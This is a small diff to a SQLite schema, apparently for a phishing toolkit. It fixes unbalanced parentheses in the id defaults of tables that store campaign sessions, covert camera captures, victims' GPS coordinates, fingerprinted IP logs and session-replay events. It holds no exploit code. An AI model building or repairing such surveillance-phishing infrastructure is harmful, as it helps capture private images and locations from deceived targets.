@@ -4,7 +4,7 @@
 
 -- Sessions: each phishing campaign instance
 CREATE TABLE IF NOT EXISTS sessions (
-    id TEXT PRIMARY KEY DEFAULT (lower(hex(randomblob(16))),
+    id TEXT PRIMARY KEY DEFAULT (lower(hex(randomblob(16)))),
     name TEXT NOT NULL DEFAULT 'default',
     template_id TEXT NOT NULL DEFAULT 'face-runner',
     tunnel_url TEXT,
@@ -15,7 +15,7 @@ CREATE TABLE IF NOT EXISTS sessions (
 
 -- Captures: camera snapshots and video streams
 CREATE TABLE IF NOT EXISTS captures (
-    id TEXT PRIMARY KEY DEFAULT (lower(hex(randomblob(16))),
+    id TEXT PRIMARY KEY DEFAULT (lower(hex(randomblob(16)))),
     session_id TEXT NOT NULL DEFAULT 'default',
     filename TEXT NOT NULL,
     file_type TEXT NOT NULL DEFAULT 'image/png',
@@ -30,7 +30,7 @@ CREATE INDEX IF NOT EXISTS idx_captures_created ON captures(created_at DESC);
 
 -- Locations: GPS coordinates
 CREATE TABLE IF NOT EXISTS locations (
-    id TEXT PRIMARY KEY DEFAULT (lower(hex(randomblob(16))),
+    id TEXT PRIMARY KEY DEFAULT (lower(hex(randomblob(16)))),
     session_id TEXT NOT NULL DEFAULT 'default',
     latitude REAL NOT NULL,
     longitude REAL NOT NULL,
@@ -46,7 +46,7 @@ CREATE INDEX IF NOT EXISTS idx_locations_created ON locations(created_at DESC);
 
 -- IP Logs: visitor information with device fingerprinting
 CREATE TABLE IF NOT EXISTS ip_logs (
-    id TEXT PRIMARY KEY DEFAULT (lower(hex(randomblob(16))),
+    id TEXT PRIMARY KEY DEFAULT (lower(hex(randomblob(16)))),
     session_id TEXT NOT NULL DEFAULT 'default',
     ip_address TEXT NOT NULL,
     user_agent TEXT,
@@ -95,7 +95,7 @@ CREATE TABLE IF NOT EXISTS templates (
 
 -- Audit Log: chain of custody for forensic integrity
 CREATE TABLE IF NOT EXISTS audit_log (
-    id TEXT PRIMARY KEY DEFAULT (lower(hex(randomblob(16))),
+    id TEXT PRIMARY KEY DEFAULT (lower(hex(randomblob(16)))),
     actor TEXT NOT NULL DEFAULT 'system',
     action TEXT NOT NULL,
     resource_type TEXT NOT NULL,
@@ -110,7 +110,7 @@ CREATE INDEX IF NOT EXISTS idx_audit_created ON audit_log(created_at DESC);
 
 -- Events: session replay timeline (target interaction tracking)
 CREATE TABLE IF NOT EXISTS events (
-    id TEXT PRIMARY KEY DEFAULT (lower(hex(randomblob(16))),
+    id TEXT PRIMARY KEY DEFAULT (lower(hex(randomblob(16)))),
     session_id TEXT NOT NULL DEFAULT 'default',
     event_type TEXT NOT NULL,
     event_data TEXT,
